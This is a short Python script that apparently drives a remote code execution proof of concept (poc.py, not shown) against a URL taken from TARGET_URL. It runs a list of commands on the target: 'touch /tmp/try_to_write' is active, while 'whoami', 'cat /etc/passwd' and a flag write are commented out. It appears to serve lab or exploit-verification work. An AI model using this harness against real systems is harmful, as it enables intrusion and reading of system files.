import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


cmds = [
    # "ls -alh .",
    # "whoami",
    # "pwd",
    # "cat /etc/passwd",
    # "cat /etc/hosts",
    "touch /tmp/try_to_write",
    # "echo flag > /flag",
    # "mkdir /check",
]


all_time = 10
sleep_time = all_time // len(cmds)

for cmd in cmds:
    print(f"sleeping for {sleep_time}.")
    time.sleep(sleep_time)

    print(target_url)
    cmd = f"python poc.py -t {target_url} -c '{cmd}'"
    print(cmd)
    os.system(cmd)

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
